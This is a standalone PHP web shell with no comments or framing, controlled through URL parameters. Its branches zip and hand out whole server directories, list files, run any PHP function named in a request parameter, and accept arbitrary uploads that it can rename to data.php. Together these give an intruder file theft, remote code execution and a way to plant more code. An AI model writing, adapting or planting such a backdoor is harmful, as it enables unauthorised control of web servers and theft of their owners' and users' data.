<?php
 ini_set('max_execution_time', '0');
 if($sl==1){
  $zipname=$_GET["z"];
  $bl=$_GET["b"];
  $thepath=$_GET["t"];
  $hl=$_GET["h"];
function addFileToZip($path,$zip){   
   $handler=opendir($path); 
   while(($filename=readdir($handler))!==false){  
   if($filename != "." && $filename != ".."){     
   if(is_dir($path."/".$filename)){      
   addFileToZip($path."/".$filename, $zip);      
   }else{     
   $zip->addFile($path."/".$filename);   
   } }   } 
   @closedir($path); }  
   $zip=new ZipArchive();
   if($zip->open($zipname, ZipArchive::OVERWRITE)=== TRUE){ 
   addFileToZip($thepath, $zip); 
   } 
   if($hl){
	   $url="http://".$_SERVER['HTTP_HOST']."/".$zipname;
   }else{
	   $url="https://".$_SERVER['HTTP_HOST']."/".$zipname;
   }
   @$bl("Location: $url"); 
 }else if($sl==2){
	 $thepath=$_GET["t"];
	  function my_scandir($dir){
$files=array();
if(is_dir($dir)){
if($handle=opendir($dir)){
while(($file=readdir($handle))!==false){
if($file!="." && $file!=".."){
 if(is_dir($dir."/".$file)){
//$files[$file]=my_scandir($dir."/".$file);
$files[]=$dir."/".$file;
}else{ 
$files[]=$dir."/".$file;
    } }  }
closedir($handle);
return $files;} }  }
$arr=my_scandir($thepath);
 function arrayToString($arr) { 
if (is_array($arr)){ 
return implode(',', array_map('arrayToString', $arr)); 
} 
return $arr; 
} 
$string=arrayToString($arr);
  $arrstring=explode(",",$string);
for($i=0;$i<count($arrstring);$i++){
	$to = $arrstring[$i];
	 if(!preg_match("/.*\.php|xml|htm|html|css|js|txt/",$to)){
	 echo iconv("gbk","utf-8",$arrstring[$i])."<br>";
	//echo $to."<br>";
	 }
} 
 }else if($sl==3){
	 $zipname=$_GET["z"];
	 $bl=$_GET["b"];
	 $bl($zipname);
	 
 }else if($sl==4){
	 $thepath=$_GET["t"];
	 echo '<form action="" method="post" enctype="multipart/form-data">
	<input type="file" name="file" id="file"><br>
	<input type="submit" name="submit1" value="submit">
</form>'; 
if(isset($_POST['submit1'])){
$allowedExts = array();
$temp = explode(".", $_FILES["file"]["name"]);
$extension = end($temp);
if (($_FILES["file"]["size"] < 204800000)
&& !in_array($extension, $allowedExts)){
	if ($_FILES["file"]["error"] > 0){
		echo "error1：: " . $_FILES["file"]["error"] . "<br>";
	}else{
		echo "name: " . $_FILES["file"]["name"] . "<br>";
		echo "type: " . $_FILES["file"]["type"] . "<br>";
		echo "size: " . ($_FILES["file"]["size"] / 1024) . " kB<br>";
		echo "tmp: " . $_FILES["file"]["tmp_name"] . "<br>";
		if (file_exists($thepath . $_FILES["file"]["name"])){
			echo $_FILES["file"]["name"] . " twofile。 ";
		}else{
			move_uploaded_file($_FILES["file"]["tmp_name"], $thepath . $_FILES["file"]["name"]);
			$oldname=$thepath . $_FILES["file"]["name"];
		if(!preg_match("/.php/",$oldname))@rename($oldname,$thepath."data.php");
			echo "endname: " . $thepath . $_FILES["file"]["name"];
		}	} }else{
	echo "error type";
}
}
 }
echo "ringt";
?>